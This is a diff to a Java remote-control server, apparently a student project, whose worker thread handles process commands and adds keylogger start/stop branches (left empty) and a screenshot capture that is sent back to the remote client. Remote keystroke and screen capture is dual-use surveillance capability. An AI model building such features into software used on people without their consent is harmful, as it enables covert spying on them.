@@ -2,6 +2,9 @@ package Function;
 
 import java.net.*;
 
+import KeyLogger.KeyLogger;
+import Protocols.command.keylog;
+import ScreenCapture.ScreenCapture;
 import process.ListProcess;
 import process.ProcessKill;
 import process.ProcessStart;
@@ -12,6 +15,7 @@ public class WorkerThread extends Thread {
 	private InputStream inputStream = null;
 	private OutputStream outputStream = null;
 	private Socket clientSocket = null;
+	
 
 	public WorkerThread(Socket clientSocket) {
 		try {
@@ -48,9 +52,15 @@ public class WorkerThread extends Thread {
 				ProcessStart processStart = new ProcessStart(oos, request_elements[1]);
 				processStart.start_file();
 				processStart.send_result();
-			}else {
-				// ......... them code vao day...........//
-				// last modyfied by phuxuan2k3 trainhaquedidepleuongcafe
+			}else if(request.equals("KEY_LOGGER_START")) {
+				
+			} else if(request.equals("KEY_LOGGER_STOP")) {
+				
+			} else if(request.equals("SCREEN_CAPTURE")){
+				System.out.println(request);
+				ScreenCapture screenCapture = new ScreenCapture(oos);
+				screenCapture.get_Screenshot();
+				screenCapture.send_ScreenShot();
 			}
 			oos.close();
 			ois.close();
